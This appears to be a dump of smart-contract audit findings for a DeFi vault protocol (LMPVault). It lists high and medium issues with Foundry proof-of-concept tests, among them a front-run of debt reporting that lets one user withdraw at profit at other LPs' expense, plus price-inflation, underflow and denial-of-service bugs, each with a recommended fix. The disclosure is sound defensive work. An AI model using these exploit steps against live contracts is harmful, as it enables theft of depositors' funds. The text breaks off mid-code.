50 baseAsset\n\n_mockRootPrice(address(_underlyerOne), 2.1 ether);\n\n// malicious updateDebtReporting by alice\n\naddress[] memory alteredDestinations = new address[](1);\n\nalteredDestinations[0] = address(_destVaultOne);\n\nvm.prank(alice);\n\n_lmpVault.updateDebtReporting(alteredDestinations);\n\n  \n\n// alice withdraws first\n\nvm.prank(alice);\n\n_lmpVault.redeem(shareBalAlice , alice,alice);\n\nuint finalBalanceAlice = _asset.balanceOf(alice);\n\nemit log_named_uint(""final Balance of alice "", finalBalanceAlice);\n\n// protocol also collects its fees\n\n// further wrecking the remaining LPs\n\nemit log_named_uint(""Fees shares give to feeSink "", _lmpVault.balanceOf(feeSink));\n\nassertGt( finalBalanceAlice, initialBalanceAlice);\n\nassertGt(_lmpVault.balanceOf(feeSink), 0);\n\n// now updateDebtReporting again but for all DVs\n\n_lmpVault.updateDebtReporting(_destinations);\n\n  \n\nemit log_named_uint(""Remaining LPs can only get "",_lmpVault.maxWithdraw(address(this)));\n\nemit log_named_uint(""Protocol falsely earned(in base asset)"", _lmpVault.maxWithdraw(feeSink));\n\nemit log_named_uint(""Vault totalAssets"" , _lmpVault.totalAssets());\n\nemit log_named_uint(""Effective loss take by LPs"", 1000 - _lmpVault.maxWithdraw(address(this)));\n\nemit log_named_uint(""Profit for Alice"",_asset.balanceOf(alice) - initialBalanceAlice);\n\n}\n```\n"ч"updateDebtReporting takes in a user input of destinations in array whose debt to report, so if a destination vault is incurring loss and is not on the front of withdrawalQueue than a attacker can just update debt for only the destination which are incurring a profit and withdraw in the same txn. He will exit the vault with profit, others who withdraw after the legit updateDebtReporting txn will suffer even more loss than they should have, as some part of the profit which was used to offset the loss was taken by the attacker and protocol fees\nPOC-\nLMPVault has 2000 in deposits 1000 from alice and 1000 from bob\nVault has invested that in 1000 in DestinationVault1 & 1000 in DestinationVault2 (no idle for simple calculations)\nNow Dv1 gain a profit of 5%(+50 base asset) while Dv2 is in 10% loss(-100 base asset)\nSo vault has net loss of 50. Now alice does a updateDebtReporting([Dv1]) and not including Dv2 in the input array.\nNow she withdraws her money, protocol now falsely believes there is a profit, it also take 20% profit fees(assumed) and mints 10 shares for itself and alice walks away with roughly 1020 assets, incurring no loss\nNow a legit updateDebtReporting txn comes and bob has to account in for the loss\n```\nfunction test_AvoidTheLoss() public {\n\n// for simplicity sake, i'll be assuming vault keeps nothing idle\n\n// as it does not affect the attack vector in any ways\n\n_accessController.grantRole(Roles.SOLVER_ROLE, address(this));\n\n_accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));\n\naddress feeSink = vm.addr(555);\n\n_lmpVault.setFeeSink(feeSink);\n\n_lmpVault.setPerformanceFeeBps(2000); // 20%\n\naddress alice = address(789);\n\nuint initialBalanceAlice = 1000;\n\n// User is going to deposit 1000 asset\n\n_asset.mint(address(this), 1000);\n\n_asset.approve(address(_lmpVault), 1000);\n\nuint shareBalUser = _lmpVault.deposit(1000, address(this));\n\n_underlyerOne.mint(address(this),500);\n\n_underlyerOne.approve(address(_lmpVault),500);\n\n_lmpVault.rebalance(\n\naddress(_destVaultOne),\n\naddress(_underlyerOne),\n\n500,\n\naddress(0),\n\naddress(_asset),\n\n1000\n\n);\n\n_asset.mint(alice,initialBalanceAlice);\n\nvm.startPrank(alice);\n\n_asset.approve(address(_lmpVault),initialBalanceAlice);\n\nuint shareBalAlice = _lmpVault.deposit(initialBalanceAlice,alice);\n\nvm.stopPrank();\n\n// rebalance to 2nd vault\n\n_underlyerTwo.mint(address(this), 1000);\n\n_underlyerTwo.approve(address(_lmpVault),1000);\n\n_lmpVault.rebalance(\n\naddress(_destVaultTwo),\n\naddress(_underlyerTwo),\n\n1000,\n\naddress(0),\n\naddress(_asset),\n\n1000\n\n);\n\n// the second destVault incurs loss, 10%\n\n_mockRootPrice(address(_underlyerTwo), 0.9 ether);\n\n  \n\n// the first vault incurs some profit, 5%\n\n// so lmpVault is in netLoss of 50 baseAsset\n\n_mockRootPrice(address(_underlyerOne), 2.1 ether);\n\n// malicious updateDebtReporting by alice\n\naddress[] memory alteredDestinations = new address[](1);\n\nalteredDestinations[0] = address(_destVaultOne);\n\nvm.prank(alice);\n\n_lmpVault.updateDebtReporting(alteredDestinations);\n\n  \n\n// alice withdraws first\n\nvm.prank(alice);\n\n_lmpVault.redeem(shareBalAlice , alice,alice);\n\nuint finalBalanceAlice = _asset.balanceOf(alice);\n\nemit log_named_uint(""final Balance of alice "", finalBalanceAlice);\n\n// protocol also collects its fees\n\n// further wrecking the remaining LPs\n\nemit log_named_uint(""Fees shares give to feeSink "", _lmpVault.balanceOf(feeSink));\n\nassertGt( finalBalanceAlice, initialBalanceAlice);\n\nassertGt(_lmpVault.balanceOf(feeSink), 0);\n\n// now updateDebtReporting again but for all DVs\n\n_lmpVault.updateDebtReporting(_destinations);\n\n  \n\nemit log_named_uint(""Remaining LPs can only get "",_lmpVault.maxWithdraw(address(this)));\n\nemit log_named_uint(""Protocol falsely earned(in base asset)"", _lmpVault.maxWithdraw(feeSink));\n\nemit log_named_uint(""Vault totalAssets"" , _lmpVault.totalAssets());\n\nemit log_named_uint(""Effective loss take by LPs"", 1000 - _lmpVault.maxWithdraw(address(this)));\n\nemit log_named_uint(""Profit for Alice"",_asset.balanceOf(alice) - initialBalanceAlice);\n\n}\n```\n\nLogs: final Balance of alice : 1019 Fees shares give to feeSink : 10 Remaining LPs can only get : 920 Protocol falsely earned(in base asset): 9 Vault totalAssets: 930 Effective loss take by LPs: 80 Profit for Alice: 19"чupdateDebtReporting should not have any input param, should by default update for all added destination vaultsчTheft of user funds. Submitting as high as attacker only needs to frontrun a updateDebtReporting txn with malicious input and withdraw his funds.\nCode Snippet\n```\nfunction updateDebtReporting(address[] calldata _destinations) external nonReentrant trackNavOps { // @audit < user controlled input\n\n_updateDebtReporting(_destinations);\n\n}\n```\n\nTool used\nManual Review
Inflated price due to unnecessary precision scalingчhighч```\naveragePrice = existing._initAcc * 1e18 / INIT_SAMPLE_COUNT;\naveragePrice = 36e18 * 1e18 / 18\naveragePrice = 36e36 / 18\naveragePrice = 2e36\n```\nчThe `price` at Line 137 below is denominated in 18 decimals as the `getPriceInEth` function always returns the `price` in 18 decimals precision.\nThere is no need to scale the accumulated price by 1e18.\nIt will cause the average price (existing._initAcc) to be inflated significantly\nThe numerator will almost always be larger than the denominator (INIT_SAMPLE_COUNT = 18). There is no risk of it rounding to zero, so any scaling is unnecessary.\nAssume that throughout the initialization process, the `getPriceInEth(XYZ)` always returns 2 ETH (2e18). After 18 rounds (INIT_SAMPLE_COUNT == 18) of initialization, `existing._initAcc` will equal 36 ETH (36e18). As such, the `averagePrice` will be as follows:\n```\naveragePrice = existing._initAcc * 1e18 / INIT_SAMPLE_COUNT;\naveragePrice = 36e18 * 1e18 / 18\naveragePrice = 36e36 / 18\naveragePrice = 2e36\n```\n\n`existing.fastFilterPrice` and `existing.slowFilterPrice` will be set to `2e36` at Lines 157 and 158 below.\nIn the post-init phase, the `getPriceInEth` function return 3 ETH (3e18). Thus, the following code will be executed at Line 144s and 155 below:\n```\nexisting.slowFilterPrice = Stats.getFilteredValue(SLOW_ALPHA, existing.slowFilterPrice, price);\nexisting.fastFilterPrice = Stats.getFilteredValue(FAST_ALPHA, existing.fastFilterPrice, price);\n\nexisting.slowFilterPrice = Stats.getFilteredValue(SLOW_ALPHA, 2e36, 3e18); // SLOW_ALPHA = 645e14; // 0.0645\nexisting.fastFilterPrice = Stats.getFilteredValue(FAST_ALPHA, 2e36, 3e18); // FAST_ALPHA = 33e16; // 0.33\n```\n\nAs shown above, the existing filter prices are significantly inflated by the scale of 1e18, which results in the prices being extremely skewed.\nUsing the formula of fast filter, the final fast filter price computed will be as follows:\n```\n((priorValue * (1e18 - alpha)) + (currentValue * alpha)) / 1e18\n((priorValue * (1e18 - 33e16)) + (currentValue * 33e16)) / 1e18\n((priorValue * 67e16) + (currentValue * 33e16)) / 1e18\n((2e36 * 67e16) + (3e18 * 33e16)) / 1e18\n1.34e36 (1340000000000000000 ETH)\n```\n\nThe token is supposed only to be worth around 3 ETH. However, the fast filter price wrongly determine that it is worth around 1340000000000000000 ETHчRemove the 1e18 scaling.\n```\nif (existing._initCount == INIT_SAMPLE_COUNT) {\n    // if this sample hits the target number, then complete initialize and set the filters\n    existing._initComplete = true;\n// Remove the line below\n    uint256 averagePrice = existing._initAcc * 1e18 / INIT_SAMPLE_COUNT;\n// Add the line below\n    uint256 averagePrice = existing._initAcc / INIT_SAMPLE_COUNT;\n    existing.fastFilterPrice = averagePrice;\n    existing.slowFilterPrice = averagePrice;\n}\n```\nчThe price returned by the stat calculators will be excessively inflated. The purpose of the stats/calculators contracts is to store, augment, and clean data relevant to the LMPs. When the solver proposes a rebalance, the strategy uses the stats contracts to calculate a composite return (score) for the proposed destinations. Using that composite return, it determines if the swap is beneficial for the vault.\nIf a stat calculator provides incorrect and inflated pricing, it can cause multiple implications that lead to losses to the protocol, such as false signals allowing the unprofitable rebalance to be executed.\nCode Snippet\nTool used\nManual Review
Incorrect pricing for CurveV2 LP Tokenчhighч"```\ndef lp_price() -> uint256:\n    """"""\n    Approximate LP token price\n    """"""\n    return 2 * self.virtual_price * self.sqrt_int(self.internal_price_oracle()) / 10**18\n```\n"ч"Using the Curve rETH/frxETH pool (0xe7c6e0a739021cdba7aac21b4b728779eef974d9) to illustrate the issue:\nThe price of the LP token of Curve rETH/frxETH pool can be obtained via the following `lp_price` function:\nhttps://etherscan.io/address/0xe7c6e0a739021cdba7aac21b4b728779eef974d9#code#L1308\n```\ndef lp_price() -> uint256:\n    """"""\n    Approximate LP token price\n    """"""\n    return 2 * self.virtual_price * self.sqrt_int(self.internal_price_oracle()) / 10**18\n```\n\nThus, the formula to obtain the price of the LP token is as follows:\n$$ price_{LP} = 2 \times virtualPrice \times \sqrt{internalPriceOracle} $$\nInformation about the $internalPriceOracle$ can be obtained from the `pool.price_oracle()` function or from the Curve's Pool page (https://curve.fi/#/ethereum/pools/factory-crypto-218/swap). Refer to the Price Data's Price Oracle section.\nhttps://etherscan.io/address/0xe7c6e0a739021cdba7aac21b4b728779eef974d9#code#L1341\n```\ndef price_oracle() -> uint256:\n    return self.internal_price_oracle()\n```\n\nThe $internalPriceOracle$ is the price of coins[1](frxETH) with coins[0](rETH) as the quote currency, which means how many rETH (quote) are needed to purchase one frxETH (base).\n$$ base/quote \ frxETH/rETH $$\nDuring pool registration, the `poolInfo.tokenToPrice` is always set to the second coin (coins[1]) as per Line 131 below. In this example, `poolInfo.tokenToPrice` will be set to frxETH token address (coins[1]).\nNote that `assetPrice` variable below is equivalent to $internalPriceOracle$ in the above formula.\nWhen fetching the price of the LP token, Line 166 computes the price of frxETH with ETH as the quote currency ($frxETH/ETH$) via the `getPriceInEth` function, and assigns to the `assetPrice` variable.\nHowever, the $internalPriceOracle$ or `assetPrice` should be $frxETH/rETH$ instead of $frxETH/ETH$. Thus, the price of the LP token computed will be incorrect."ч
Aura/Convex rewards are stuck after DOSчhighч```\nfunction getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n    uint256 reward = earned(_account);\n    if (reward > 0) {\n        rewards[_account] = 0;\n        rewardToken.safeTransfer(_account, reward);\n        IDeposit(operator).rewardClaimed(pid, _account, reward);\n        emit RewardPaid(_account, reward);\n    }\n\n    //also get rewards from linked rewards\n    if(_claimExtras){\n        for(uint i=0; i < extraRewards.length; i++){\n            IRewards(extraRewards[i]).getReward(_account);\n        }\n    }\n    return true;\n}\n```\nч"Anyone can claim Convex rewards for any account.\nhttps://etherscan.io/address/0x0A760466E1B4621579a82a39CB56Dda2F4E70f03#code\n```\nfunction getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n    uint256 reward = earned(_account);\n    if (reward > 0) {\n        rewards[_account] = 0;\n        rewardToken.safeTransfer(_account, reward);\n        IDeposit(operator).rewardClaimed(pid, _account, reward);\n        emit RewardPaid(_account, reward);\n    }\n\n    //also get rewards from linked rewards\n    if(_claimExtras){\n        for(uint i=0; i < extraRewards.length; i++){\n            IRewards(extraRewards[i]).getReward(_account);\n        }\n    }\n    return true;\n}\n```\n\nIn ConvexRewardsAdapter, the rewards are accounted for by using balanceBefore/after.\n```\nfunction _claimRewards(\n    address gauge,\n    address defaultToken,\n    address sendTo\n) internal returns (uint256[] memory amounts, address[] memory tokens) {\n\n  uint256[] memory balancesBefore = new uint256[](totalLength);\n    uint256[] memory amountsClaimed = new uint256[](totalLength);\n// rest of code\n\n  for (uint256 i = 0; i < totalLength; ++i) {\n        uint256 balance = 0;\n        // Same check for ""stash tokens""\n        if (IERC20(rewardTokens[i]).totalSupply() > 0) {\n            balance = IERC20(rewardTokens[i]).balanceOf(account);\n        }\n\n        amountsClaimed[i] = balance - balancesBefore[i];\n\n return (amountsClaimed, rewardTokens);\n```\n\nAdversary can call the external convex contract’s `getReward(tokemakContract)`. After this, the reward tokens are transferred to Tokemak without an accounting hook.\nNow, when Tokemak calls claimRewards, then no new rewards are transferred, because the attacker already transferred them. `amountsClaimed` will be 0."ч
`LMPVault._withdraw()` can revert due to an arithmetic underflowчmediumч```\n    function test_revert_underflow() public {\n        _accessController.grantRole(Roles.SOLVER_ROLE, address(this));\n        _accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));\n\n        // User is going to deposit 1500 asset\n        _asset.mint(address(this), 1500);\n        _asset.approve(address(_lmpVault), 1500);\n        _lmpVault.deposit(1500, address(this));\n\n        // Deployed 700 asset to DV1\n        _underlyerOne.mint(address(this), 700);\n        _underlyerOne.approve(address(_lmpVault), 700);\n        _lmpVault.rebalance(\n            address(_destVaultOne),\n            address(_underlyerOne), // tokenIn\n            700,\n            address(0), // destinationOut, none when sending out baseAsset\n            address(_asset), // baseAsset, tokenOut\n            700\n        );\n\n        // Deploy 600 asset to DV2\n        _underlyerTwo.mint(address(this), 600);\n        _underlyerTwo.approve(address(_lmpVault), 600);\n        _lmpVault.rebalance(\n            address(_destVaultTwo),\n            address(_underlyerTwo), // tokenIn\n            600,\n            address(0), // destinationOut, none when sending out baseAsset\n            address(_asset), // baseAsset, tokenOut\n            600\n        );\n\n        // Deployed 200 asset to DV3\n        _underlyerThree.mint(address(this), 200);\n        _underlyerThree.approve(address(_lmpVault), 200);\n        _lmpVault.rebalance(\n            address(_destVaultThree),\n            address(_underlyerThree), // tokenIn\n            200,\n            address(0), // destinationOut, none when sending out baseAsset\n            address(_asset), // baseAsset, tokenOut\n            200\n        );\n\n        // Drop the price of DV2 to 70% of original, so that 600 we transferred out is now only worth 420\n         _mockRootPrice(address(_underlyerTwo), 7e17);\n\n        // Revert because of an arithmetic underflow\n        vm.expectRevert();\n        uint256 assets = _lmpVault.redeem(1000, address(this), address(this));\n    }\n```\nчInside the `_withdraw()` function, the `maxAssetsToPull` argument value of `_calcUserWithdrawSharesToBurn()` is calculated to be equal to `info.totalAssetsToPull - Math.max(info.debtDecrease, info.totalAssetsPulled)`. However, the `_withdraw()` function only halts its loop when `info.totalAssetsPulled >= info.totalAssetsToPull`. This can lead to a situation where `info.debtDecrease >= info.totalAssetsToPull`. Consequently, when calculating `info.totalAssetsToPull - Math.max(info.debtDecrease, info.totalAssetsPulled)` for the next destination vault in the loop, an underflow occurs and triggers a contract revert.\nTo illustrate this vulnerability, consider the following scenario:\n```\n    function test_revert_underflow() public {\n        _accessController.grantRole(Roles.SOLVER_ROLE, address(this));\n        _accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));\n\n        // User is going to deposit 1500 asset\n        _asset.mint(address(this), 1500);\n        _asset.approve(address(_lmpVault), 1500);\n        _lmpVault.deposit(1500, address(this));\n\n        // Deployed 700 asset to DV1\n        _underlyerOne.mint(address(this), 700);\n        _underlyerOne.approve(address(_lmpVault), 700);\n        _lmpVault.rebalance(\n            address(_destVaultOne),\n            address(_underlyerOne), // tokenIn\n            700,\n            address(0), // destinationOut, none when sending out baseAsset\n            address(_asset), // baseAsset, tokenOut\n            700\n        );\n\n        // Deploy 600 asset to DV2\n        _underlyerTwo.mint(address(this), 600);\n        _underlyerTwo.approve(address(_lmpVault), 600);\n        _lmpVault.rebalance(\n            address(_destVaultTwo),\n            address(_underlyerTwo), // tokenIn\n            600,\n            address(0), // destinationOut, none when sending out baseAsset\n            address(_asset), // baseAsset, tokenOut\n            600\n        );\n\n        // Deployed 200 asset to DV3\n        _underlyerThree.mint(address(this), 200);\n        _underlyerThree.approve(address(_lmpVault), 200);\n        _lmpVault.rebalance(\n            address(_destVaultThree),\n            address(_underlyerThree), // tokenIn\n            200,\n            address(0), // destinationOut, none when sending out baseAsset\n            address(_asset), // baseAsset, tokenOut\n            200\n        );\n\n        // Drop the price of DV2 to 70% of original, so that 600 we transferred out is now only worth 420\n         _mockRootPrice(address(_underlyerTwo), 7e17);\n\n        // Revert because of an arithmetic underflow\n        vm.expectRevert();\n        uint256 assets = _lmpVault.redeem(1000, address(this), address(this));\n    }\n```\nч
LMPVault.updateDebtReporting could underflow because of subtraction before additionчmediumч```\n// rest of code\nL292    totalDebtBurn = cachedCurrentDebt.mulDiv(sharesToBurn, cachedDvShares, Math.Rounding.Up);\n// rest of code\nL440    uint256 currentDebt = (destInfo.currentDebt * originalShares) / Math.max(destInfo.ownedShares, 1);\nL448    totalDebtDecrease = currentDebt;\n```\nч`debt = totalDebt - prevNTotalDebt + afterNTotalDebt` where prevNTotalDebt equals `(destInfo.currentDebt * originalShares) / Math.max(destInfo.ownedShares, 1)` and the key to finding a scenario for underflow starts by noting that each value deducted from totalDebt is calculated as `cachedCurrentDebt.mulDiv(sharesToBurn, cachedDvShares, Math.Rounding.Up)`\nLMPDebt\n```\n// rest of code\nL292    totalDebtBurn = cachedCurrentDebt.mulDiv(sharesToBurn, cachedDvShares, Math.Rounding.Up);\n// rest of code\nL440    uint256 currentDebt = (destInfo.currentDebt * originalShares) / Math.max(destInfo.ownedShares, 1);\nL448    totalDebtDecrease = currentDebt;\n```\n\nLet: `totalDebt = destInfo.currentDebt = destInfo.debtBasis = cachedCurrentDebt = cachedDebtBasis = 11` `totalSupply = destInfo.ownedShares = cachedDvShares = 10`\nThat way: `cachedCurrentDebt * 1 / cachedDvShares = 1.1` but totalDebtBurn would be rounded up to 2\n`sharesToBurn` could easily be 1 if there was a loss that changes the ratio from `1:1.1` to `1:1`. Therefore `currentDvDebtValue = 10 * 1 = 10`\n```\nif (currentDvDebtValue < updatedDebtBasis) {\n    // We are currently sitting at a loss. Limit the value we can pull from\n    // the destination vault\n    currentDvDebtValue = currentDvDebtValue.mulDiv(userShares, totalVaultShares, Math.Rounding.Down);\n    currentDvShares = currentDvShares.mulDiv(userShares, totalVaultShares, Math.Rounding.Down);\n}\n\n// Shouldn't pull more than we want\n// Or, we're not in profit so we limit the pull\nif (currentDvDebtValue < maxAssetsToPull) {\n    maxAssetsToPull = currentDvDebtValue;\n}\n\n// Calculate the portion of shares to burn based on the assets we need to pull\n// and the current total debt value. These are destination vault shares.\nsharesToBurn = currentDvShares.mulDiv(maxAssetsToPull, currentDvDebtValue, Math.Rounding.Up);\n```\n\nSteps\ncall redeem 1 share and previewRedeem request 1 `maxAssetsToPull`\n2 debt would be burn\nTherefore totalDebt = 11-2 = 9\ncall another redeem 1 share and request another 1 `maxAssetsToPull`\n2 debts would be burn again and\ntotalDebt would be 7, but prevNTotalDebt = 11 * 8 // 10 = 8\nUsing 1, 10 and 11 are for illustration and the underflow could occur in several other ways. E.g if we had used `100,001`, `1,000,010` and `1,000,011` respectively.ч
LMPVault: DoS when `feeSink` balance hits `perWalletLimit`чmediumч```\nfunction _collectFees(uint256 idle, uint256 debt, uint256 totalSupply) internal {\n    address sink = feeSink;\n    // rest of code.\n    if (fees > 0 && sink != address(0)) {\n        // Calculated separate from other mints as normal share mint is round down\n        shares = _convertToShares(fees, Math.Rounding.Up);\n        _mint(sink, shares);\n        emit Deposit(address(this), sink, fees, shares);\n    }\n    // rest of code.\n}\n```\nч`_collectFees` mints shares to `feeSink`.\n```\nfunction _collectFees(uint256 idle, uint256 debt, uint256 totalSupply) internal {\n    address sink = feeSink;\n    // rest of code.\n    if (fees > 0 && sink != address(0)) {\n        // Calculated separate from other mints as normal share mint is round down\n        shares = _convertToShares(fees, Math.Rounding.Up);\n        _mint(sink, shares);\n        emit Deposit(address(this), sink, fees, shares);\n    }\n    // rest of code.\n}\n```\n\n`_mint` calls `_beforeTokenTransfer` internally to check if the target wallet exceeds `perWalletLimit`.\n```\nfunction _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override whenNotPaused {\n    // rest of code.\n    if (balanceOf(to) + amount > perWalletLimit) {\n        revert OverWalletLimit(to);\n    }\n}\n```\n\n`_collectFees` function will revert if `balanceOf(feeSink) + fee shares > perWalletLimit`. `updateDebtReporting`, `rebalance` and `flashRebalance` call `_collectFees` internally so they will be unfunctional.чAllow `feeSink` to exceeds `perWalletLimit`.ч`updateDebtReporting`, `rebalance` and `flashRebalance` won't be working if `feeSink` balance hits `perWalletLimit`.\nCode Snippet\nTool used\nManual Review
Incorrect amount given as input to `_handleRebalanceIn` when `flashRebalance` is calledчmediumч"```\nfunction flashRebalance(\n    DestinationInfo storage destInfoOut,\n    DestinationInfo storage destInfoIn,\n    IERC3156FlashBorrower receiver,\n    IStrategy.RebalanceParams memory params,\n    FlashRebalanceParams memory flashParams,\n    bytes calldata data\n) external returns (uint256 idle, uint256 debt) {\n    // rest of code\n\n    // Handle increase (shares coming ""In"", getting underlying from the swapper and trading for new shares)\n    if (params.amountIn > 0) {\n        IDestinationVault dvIn = IDestinationVault(params.destinationIn);\n\n        // get ""before"" counts\n        uint256 tokenInBalanceBefore = IERC20(params.tokenIn).balanceOf(address(this));\n\n        // Give control back to the solver so they can make use of the ""out"" assets\n        // and get our ""in"" asset\n        bytes32 flashResult = receiver.onFlashLoan(msg.sender, params.tokenIn, params.amountIn, 0, data);\n\n        // We assume the solver will send us the assets\n        uint256 tokenInBalanceAfter = IERC20(params.tokenIn).balanceOf(address(this));\n\n        // Make sure the call was successful and verify we have at least the assets we think\n        // we were getting\n        if (\n            flashResult != keccak256(""ERC3156FlashBorrower.onFlashLoan"")\n                || tokenInBalanceAfter < tokenInBalanceBefore + params.amountIn\n        ) {\n            revert Errors.FlashLoanFailed(params.tokenIn, params.amountIn);\n        }\n\n        if (params.tokenIn != address(flashParams.baseAsset)) {\n            // @audit should be `tokenInBalanceAfter - tokenInBalanceBefore` given to `_handleRebalanceIn`\n            (uint256 debtDecreaseIn, uint256 debtIncreaseIn) =\n                _handleRebalanceIn(destInfoIn, dvIn, params.tokenIn, tokenInBalanceAfter);\n            idleDebtChange.debtDecrease += debtDecreaseIn;\n            idleDebtChange.debtIncrease += debtIncreaseIn;\n        } else {\n            idleDebtChange.idleIncrease += tokenInBalanceAfter - tokenInBalanceBefore;\n        }\n    }\n    // rest of code\n}\n```\n"ч"The issue occurs in the `flashRebalance` function below :\n```\nfunction flashRebalance(\n    DestinationInfo storage destInfoOut,\n    DestinationInfo storage destInfoIn,\n    IERC3156FlashBorrower receiver,\n    IStrategy.RebalanceParams memory params,\n    FlashRebalanceParams memory flashParams,\n    bytes calldata data\n) external returns (uint256 idle, uint256 debt) {\n    // rest of code\n\n    // Handle increase (shares coming ""In"", getting underlying from the swapper and trading for new shares)\n    if (params.amountIn > 0) {\n        IDestinationVault dvIn = IDestinationVault(params.destinationIn);\n\n        // get ""before"" counts\n        uint256 tokenInBalanceBefore = IERC20(params.tokenIn).balanceOf(address(this));\n\n        // Give control back to the solver so they can make use of the ""out"" assets\n        // and get our ""in"" asset\n        bytes32 flashResult = receiver.onFlashLoan(msg.sender, params.tokenIn, params.amountIn, 0, data);\n\n        // We assume the solver will send us the assets\n        uint256 tokenInBalanceAfter = IERC20(params.tokenIn).balanceOf(address(this));\n\n        // Make sure the call was successful and verify we have at least the assets we think\n        // we were getting\n        if (\n            flashResult != keccak256(""ERC3156FlashBorrower.onFlashLoan"")\n                || tokenInBalanceAfter < tokenInBalanceBefore + params.amountIn\n        ) {\n            revert Errors.FlashLoanFailed(params.tokenIn, params.amountIn);\n        }\n\n        if (params.tokenIn != address(flashParams.baseAsset)) {\n            // @audit should be `tokenInBalanceAfter - tokenInBalanceBefore` given to `_handleRebalanceIn`\n            (uint256 debtDecreaseIn, uint256 debtIncreaseIn) =\n                _handleRebalanceIn(destInfoIn, dvIn, params.tokenIn, tokenInBalanceAfter);\n            idleDebtChange.debtDecrease += debtDecreaseIn;\n            idleDebtChange.debtIncrease += debtIncreaseIn;\n        } else {\n            idleDebtChange.idleIncrease += tokenInBalanceAfter - tokenInBalanceBefore;\n        }\n    }\n    // rest of code\n}\n```\n\nAs we can see from the code above, the function executes a flashloan in order to receive th tokenIn amount which should be the difference between `tokenInBalanceAfter` (balance of the contract after the flashloan) and `tokenInBalanceBefore` (balance of the contract before the flashloan) : `tokenInBalanceAfter` - `tokenInBalanceBefore`.\nBut when calling the `_handleRebalanceIn` function the wrong deposit amount is given as input, as the total balance `tokenInBalanceAfter` is used instead of the received amount `tokenInBalanceAfter` - tokenInBalanceBefore.\nBecause the `_handleRebalanceIn` function is supposed to deposit the input amount to the destination vault, this error can result in sending a larger amount of funds to DV then what was intended or this error can cause a DOS of the `flashRebalance` function (due to the insufficient amount error when performing the transfer to DV), all of this will make the rebalance operation fail (or not done correctely) which can have a negative impact on the LMPVault."ч"Use the correct received tokenIn amount `tokenInBalanceAfter - tokenInBalanceBefore` as input to the `_handleRebalanceIn` function :\n```\nfunction flashRebalance(\n    DestinationInfo storage destInfoOut,\n    DestinationInfo storage destInfoIn,\n    IERC3156FlashBorrower receiver,\n    IStrategy.RebalanceParams memory params,\n    FlashRebalanceParams memory flashParams,\n    bytes calldata data\n) external returns (uint256 idle, uint256 debt) {\n    // rest of code\n\n    // Handle increase (shares coming ""In"", getting underlying from the swapper and trading for new shares)\n    if (params.amountIn > 0) {\n        IDestinationVault dvIn = IDestinationVault(params.destinationIn);\n\n        // get ""before"" counts\n        uint256 tokenInBalanceBefore = IERC20(params.tokenIn).balanceOf(address(this));\n\n        // Give control back to the solver so they can make use of the ""out"" assets\n        // and get our ""in"" asset\n        bytes32 flashResult = receiver.onFlashLoan(msg.sender, params.tokenIn, params.amountIn, 0, data);\n\n        // We assume the solver will send us the assets\n        uint256 tokenInBalanceAfter = IERC20(params.tokenIn).balanceOf(address(this));\n\n        // Make sure the call was successful and verify we have at least the assets we think\n        // we were getting\n        if (\n            flashResult != keccak256(""ERC3156FlashBorrower.onFlashLoan"")\n                || tokenInBalanceAfter < tokenInBalanceBefore + params.amountIn\n        ) {\n            revert Errors.FlashLoanFailed(params.tokenIn, params.amountIn);\n        }\n\n        if (params.tokenIn != address(flashParams.baseAsset)) {\n            // @audit Use `tokenInBalanceAfter - tokenInBalanceBefore` as input\n            (uint256 debtDecreaseIn, uint256 debtIncreaseIn) =\n                _handleRebalanceIn(destInfoIn, dvIn, params.tokenIn, tokenInBalanceAfter - tokenInBalanceBefore);\n            idleDebtChange.debtDecrease += debtDecreaseIn;\n            idleDebtChange.debtIncrease += debtIncreaseIn;\n        } else {\n            idleDebtChange.idleIncrease += tokenInBalanceAfter - tokenInBalanceBefore;\n        }\n    }\n    // rest of code\n}\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nTrumpero commented:\n"чSee summary\nCode Snippet\nTool used\nManual Review
OOG / unexpected reverts due to incorrect usage of staticcall.чmediumч"```\nunction testAttack() public {\n        mockRootPrice(WSTETH, 1_123_300_000_000_000_000); //wstETH\n        mockRootPrice(CBETH, 1_034_300_000_000_000_000); //cbETH\n\n        IBalancerMetaStablePool pool = IBalancerMetaStablePool(WSTETH_CBETH_POOL);\n\n        address[] memory assets = new address[](2);\n        assets[0] = WSTETH;\n        assets[1] = CBETH;\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 10_000 ether;\n        amounts[1] = 0;\n\n        IBalancerVault.JoinPoolRequest memory joinRequest = IBalancerVault.JoinPoolRequest({\n            assets: assets,\n            maxAmountsIn: amounts, // maxAmountsIn,\n            userData: abi.encode(\n                IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,\n                amounts, //maxAmountsIn,\n                0\n            ),\n            fromInternalBalance: false\n        });\n\n        IBalancerVault.SingleSwap memory swapRequest = IBalancerVault.SingleSwap({\n            poolId: 0x9c6d47ff73e0f5e51be5fd53236e3f595c5793f200020000000000000000042c,\n            kind: IBalancerVault.SwapKind.GIVEN_IN,\n            assetIn: WSTETH,\n            assetOut: CBETH,\n            amount: amounts[0],\n            userData: abi.encode(\n                IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,\n                amounts, //maxAmountsIn,\n                0\n            )\n        });\n\n        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({\n            sender: address(this),\n            fromInternalBalance: false,\n            recipient: payable(address(this)),\n            toInternalBalance: false\n        });\n\n        emit log_named_uint(""Gas before price1"", gasleft());\n        uint256 price1 = oracle.getPriceInEth(WSTETH_CBETH_POOL);\n        emit log_named_uint(""price1"", price1);\n        emit log_named_uint(""Gas after price1 "", gasleft());\n    }\n```\n"ч"The issue is that this burns up all the gas sent with the call. According to EIP150, a call gets allocated 63/64 bits of the gas, and the entire 63/64 parts of the gas is burnt up after the staticcall, since the staticcall will always encounter a storage change. This is also highlighted in the balancer monorepo, which has guidelines on how to check re-entrancy here.\nThis can also be shown with a simple POC.\n```\nunction testAttack() public {\n        mockRootPrice(WSTETH, 1_123_300_000_000_000_000); //wstETH\n        mockRootPrice(CBETH, 1_034_300_000_000_000_000); //cbETH\n\n        IBalancerMetaStablePool pool = 